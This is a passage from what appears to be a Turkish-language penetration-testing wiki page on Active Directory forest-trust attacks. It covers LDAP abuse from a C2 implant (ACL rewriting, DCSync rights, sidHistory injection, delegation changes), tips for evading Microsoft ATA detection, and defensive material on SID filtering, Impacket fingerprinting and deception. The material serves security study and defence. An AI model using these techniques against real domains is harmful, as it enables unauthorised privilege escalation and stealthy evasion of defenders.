Tamamlayıcı delegated MSA saldırısı (BadSuccessor – migration attributes'ın kötüye kullanılması):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek harici araştırma: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema değişikliği saldırısı**

Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD nesnelerinin oluşturulmasını beklemek gerekir. SYSTEM yetkileriyle saldırgan, herhangi bir kullanıcıya tüm sınıflar üzerinde tam denetim vermek için AD Schema'yı değiştirebilir. Bu, yeni oluşturulan AD nesnelerine yetkisiz erişime ve bunlar üzerinde denetime yol açabilir.

Daha fazla bilgi için [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) içeriğine göz atabilirsiniz.<sup>[[14]](#references)</sup>

**ADCS ESC5 ile DA'dan EA'ya yükselme**

ADCS ESC5 güvenlik açığı, forest içindeki herhangi bir kullanıcı olarak kimlik doğrulamayı sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) nesneleri üzerindeki denetimi hedefler. PKI nesneleri Configuration NC'de bulunduğundan, yazılabilir bir child DC'yi ele geçirmek ESC5 saldırılarının gerçekleştirilmesini sağlar.

Bu konuyla ilgili daha fazla bilgiye [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) içeriğinden ulaşabilirsiniz.<sup>[[15]](#references)</sup> ADCS bulunmayan senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) içeriğinde ele alındığı gibi gerekli bileşenleri kurabilir.<sup>[[16]](#references)</sup>

### Harici Forest Domain'i - Tek Yönlü (Inbound) veya çift yönlü

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Bu senaryoda **harici bir domain sizin domain'inize güvenir** ve bu da size harici domain üzerinde **kapsamı belirlenmemiş izinler** sağlar. Domain'inizdeki **hangi principal'ların harici domain üzerinde hangi erişim haklarına sahip olduğunu** bulmanız ve ardından bunu exploit etmeye çalışmanız gerekir:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - Tek Yönlü (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Bu senaryoda **domain’iniz**, **farklı domain’lerdeki** principal’lara bazı **yetkiler** **devrediyor**.

Ancak bir **domain, trusting domain tarafından trust edildiğinde**, trusted domain **tahmin edilebilir bir ad** kullanan ve **trusted password’ı parola olarak kullanan bir kullanıcı** oluşturur. Bu da trusting domain’deki bir kullanıcıya **erişip trusted domain’e girmeyi**, onu enumerate etmeyi ve daha fazla yetki yükseltmeyi denemeyi mümkün kılar:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain’i ele geçirmenin başka bir yolu, domain trust’ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu pek yaygın değildir).

Trusted domain’i ele geçirmenin başka bir yolu, **trusted domain’den bir kullanıcının erişebildiği** bir makinede bekleyip kullanıcının **RDP** ile oturum açmasını beklemektir. Ardından saldırgan, RDP oturum sürecine kod enjekte edebilir ve buradan **kurbanın kaynak domain’ine erişebilir**.\
Ayrıca, **kurban sabit diskini bağladıysa**, saldırgan **RDP oturum** sürecinden **sabit diskin başlangıç klasörüne** **backdoor’lar** yerleştirebilir. Bu tekniğe **RDPInception** denir.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust kötüye kullanımını azaltma

### **SID Filtering:**

- Forest trust’ları üzerinden SID history özniteliğinden yararlanan saldırıların riski, varsayılan olarak tüm forest’lar arası trust’larda etkin olan SID Filtering ile azaltılır. Bu yaklaşım, Microsoft’un güvenlik sınırı olarak domain’i değil forest’ı kabul etmesi doğrultusunda, forest içi trust’ların güvenli olduğu varsayımına dayanır.
- Ancak bir sorun var: SID filtering uygulamaları ve kullanıcı erişimini aksatabilir; bu nedenle zaman zaman devre dışı bırakılır.

### **Selective Authentication:**

- Forest’lar arası trust’larda Selective Authentication kullanmak, iki forest’taki kullanıcıların otomatik olarak kimlik doğrulamasından geçmemesini sağlar. Bunun yerine, kullanıcıların trusting domain veya forest içindeki domain’lere ve sunuculara erişebilmesi için açık izinler gerekir.
- Bu önlemlerin, yazılabilir Configuration Naming Context’ten (NC) yararlanılmasına veya trust account’ına yönelik saldırılara karşı koruma sağlamadığını unutmamak önemlidir.

[**ired.team’de domain trust’ları hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant’lardan LDAP tabanlı AD kötüye kullanımı

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD tarzı LDAP primitive’lerini tamamen on-host implant içinde çalışan x64 Beacon Object Files olarak yeniden uygular (ör. Adaptix C2). Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` komutuyla derler, `ldap.axs` dosyasını yükler ve ardından beacon’dan `ldap <subcommand>` komutunu çalıştırır. Tüm trafik, LDAP (389) üzerinden imzalama/şifreleme kullanarak veya otomatik sertifika güveniyle LDAPS (636) üzerinden mevcut oturum açma güvenlik bağlamını kullanır; bu nedenle socks proxy’lerine veya disk üzerinde artifact’lere gerek yoktur.<sup>[[4]](#references)</sup>

### Implant tarafında LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, kısa adları/OU yollarını tam DN’lere çözümler ve karşılık gelen nesneleri döker.
- `get-object`, `get-attribute` ve `get-domaininfo`, rastgele öznitelikleri (güvenlik tanımlayıcıları dahil) ve `rootDSE` üzerinden forest/domain meta verilerini alır.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, LDAP üzerinden doğrudan roasting adaylarını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) tanımlayıcılarını gösterir.
- `get-acl` ve `get-writable --detailed`, DACL’yi ayrıştırarak trustee’leri, hakları (GenericAll/WriteDACL/WriteOwner/öznitelik yazma) ve devralmayı listeler; böylece ACL üzerinden yetki yükseltme için hedefleri hemen belirler.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Yetki yükseltme ve kalıcılık için LDAP yazma ilkelleri

- Nesne oluşturma BOF'ları (`add-user`, `add-computer`, `add-group`, `add-ou`), OU üzerinde hakların bulunduğu her yerde operatörün yeni principal'lar veya makine hesapları oluşturmasına olanak tanır. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, yazma özelliği hakları bulunduğunda hedefleri doğrudan ele geçirir.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD nesnesi üzerindeki WriteDACL/WriteOwner haklarını parola sıfırlama, grup üyeliğini denetleme veya DCSync replikasyon ayrıcalıklarına dönüştürür; bunu PowerShell/ADSI izleri bırakmadan yapar. `remove-*` karşılıkları eklenen ACE'leri temizler.

### Delegation, roasting ve Kerberos istismarı

- `add-spn`/`set-spn`, ele geçirilmiş bir kullanıcıyı anında Kerberoastable hâle getirir; `add-asreproastable` (UAC değişikliği) parolaya dokunmadan kullanıcıyı AS-REP roasting için işaretler.
- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC bayraklarını veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini yeniden yazarak constrained/unconstrained/RBCD saldırı yollarını etkinleştirir ve uzak PowerShell ya da RSAT ihtiyacını ortadan kaldırır.

### sidHistory enjeksiyonu, OU taşıma ve saldırı yüzeyini şekillendirme

- `add-sidhistory`, denetlenen bir principal'ın SID geçmişine ayrıcalıklı SID'ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın) ve tamamen LDAP/LDAPS üzerinden gizli erişim devralma olanağı sağlar.
- `move-object`, bilgisayarların veya kullanıcıların DN/OU değerini değiştirerek saldırganın, `set-password`, `add-groupmember` veya `add-spn` komutlarını kötüye kullanmadan önce varlıkları devredilmiş hakların bulunduğu OU'lara taşımasına olanak tanır.
- Kapsamı sıkı biçimde belirlenmiş kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör kimlik bilgilerini veya kalıcılığı ele geçirdikten sonra hızlı geri alma olanağı sunarak telemetriyi en aza indirir.

## AD -> Azure ve Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Kimlik bilgilerini nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Kimlik Bilgilerini Korumaya Yönelik Savunma Önlemleri**

- **Domain Admins kısıtlamaları**: Domain Admins hesaplarının yalnızca Domain Controller'larda oturum açmasına izin verilmesi, diğer makinelerde kullanılmalarının önlenmesi önerilir.
- **Service Account ayrıcalıkları**: Güvenliği korumak için hizmetler Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Ayrıcalıkların süreyle sınırlandırılması**: DA ayrıcalıkları gerektiren görevlerin süresi kısıtlanmalıdır. Bu, şu şekilde yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay azaltma**: 2889/3074/3075 Event ID'lerini denetleyin, ardından LDAP MITM/relay girişimlerini engellemek için DC'lerde/istemcilerde LDAP signing ve LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket etkinliğinin protokol düzeyinde parmak izini çıkarma

Yaygın AD tradecraft'ını tespit etmek istiyorsanız, yeniden adlandırılmış ikili dosyalar, hizmet adları, geçici batch dosyaları veya çıktı yolları gibi **operatörün değiştirebildiği izlere** tek başına güvenmeyin. Meşru Windows istemcilerinin [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI trafiğini nasıl oluşturduğunu temel çizgi olarak belirleyin; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını değiştirdikten sonra bile kalan **uygulama farklılıklarını** arayın.<sup>[[8]](#references)</sup>

- **Yüksek güvenilirlikli bağımsız adaylar** (kendi temel çizginizle doğruladıktan sonra):
  - `auth_context_id = 79231 + ctx_id` kullanan kimliği doğrulanmış DCE/RPC
  - `0xff` ile doldurulmuş DCE/RPC kimlik doğrulama dolgusu
  - Ham Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` alanına yerleştiren LDAP Kerberos bind'leri
  - ASCII'ye benzer `ClientGuid` değerleri içeren SMB2/3 negotiate istekleri
  - Standart olmayan `//./root/cimv2` namespace'ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
  - Sabit kodlanmış Kerberos nonce değerleri
- **Korelasyon/puanlama özellikleri olarak kullanılması daha uygundur**:
  - Seyrek veya yinelenen Kerberos etype listeleri, alışılmadık/eksik `PA-DATA` ya da yerel Windows'tan farklı TGS-REQ etype sıralaması
  - Sürüm bilgisi olmayan NTLM Type 1 mesajları veya null ana bilgisayar adları içeren Type 3 mesajları
  - SPNEGO yerine DCE/RPC içinde taşınan ham NTLMSSP, eksik DCE/RPC verification trailer'ları veya SPNEGO/Kerberos OID uyuşmazlıkları
  - Aynı ana bilgisayar/kullanıcı/oturum/zaman aralığında bu özelliklerden birkaçının görülmesi, tek bir zayıf alandan çok daha güçlüdür
- **Bağımsız uyarılar olarak değil, zenginleştirme amacıyla kullanın**:
  - Varsayılan dosya adları, çıktı yolları, rastgele hizmet adları, geçici batch adları, varsayılan bilgisayar hesabı adları ve araçlara özgü HTTP/WebDAV/RDP/MSSQL dizeleri
  - Operatörler bunları kolayca değiştirebilir; bu nedenle en iyi kullanım alanları, protokoller arası bir kümelenmenin neden şüpheli olduğunu açıklamaktır
- **Operasyonel notlar**:
  - Bu sinyallerin bazıları şifresi çözülmüş trafik, [PCAP/Zeek ayrıştırması](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya hizmet tarafı görünürlüğü gerektirir
  - Uyarı üretmeden önce Samba/Linux istemcileri, cihazlar ve eski yazılımlarla doğrulayın
  - Temel çizgiye duyduğunuz güven arttıkça tespitleri zenginleştirme -> hunting -> uyarı aşamalarında ilerletin

### **Deception Tekniklerini Uygulama**

- Deception uygulamak; parolası süresi dolmayan veya Trusted for Delegation olarak işaretlenmiş özelliklere sahip kullanıcı ya da bilgisayar tuzakları kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip kullanıcılar oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi kapsar.<sup>[[2]](#references)</sup>
- Uygulamalı bir örnek olarak şu araç kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerini uygulama hakkında daha fazla bilgiye [GitHub'daki Deploy-Deception](https://github.com/samratashok/Deploy-Deception) üzerinden ulaşabilirsiniz.

### **Deception'ı Tanımlama**

- **Kullanıcı Nesnelerinde**: Şüpheli göstergeler arasında alışılmadık ObjectSID, seyrek oturum açma, oluşturulma tarihleri ve düşük sayıda hatalı parola denemesi bulunur.
- **Genel Göstergeler**: Olası decoy nesnelerin özniteliklerini gerçek nesnelerinkilerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu tür deception'ları belirlemeye yardımcı olabilir.

### **Tespit Sistemlerini Atlatma**

- **Microsoft ATA tespitini atlatma**:
  - **Kullanıcı numaralandırma**: ATA tespitini önlemek için Domain Controller'larda oturum numaralandırmasından kaçınma.
  - **Ticket taklidi**: Ticket oluştururken **aes** anahtarlarını kullanmak, NTLM'e düşürmeyi önleyerek tespitten kaçmaya yardımcı olur.
  - **DCSync saldırıları**: ATA tespitini önlemek için işlemi Domain Controller olmayan bir makineden gerçekleştirmek önerilir; doğrudan Domain Controller'dan gerçekleştirmek uyarıları tetikler.

## References

- [1] [Domain Trust'larına Saldırı Rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trust'ları Sahteleme](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Koleksiyonu – Active Directory İstismarı için Bellek İçi LDAP Araç Seti](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash'lerini Wordlist Olarak Silahlandırma](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Korsanlar](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ı İnceleme](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon Üzerinden Active Directory Hesaplarını Ele Geçirme](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon güvenli kanal bağlantılarındaki değişiklikleri yönetme](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC arayüzlerine yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Etki alanları arasında güvenlik sınırı olarak SID filter? (Bölüm 4) - SID filtering'i atlatma araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Etki alanları arasında güvenlik sınırı olarak SID filter? (Bölüm 5) - Golden GMSA trust saldırısı - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Etki alanları arasında güvenlik sınırı olarak SID filter? (Bölüm 6) - Schema change trust saldırısı - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'den EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS'yi istismar ederek child domain yöneticilerinden enterprise admin'lere 5 dakikada yükselme: devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Gizli Bir ACE: Active Directory DACL Arka Kapılarını Tasarlama](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k modülünün kaynak kodu](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership özniteliği](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
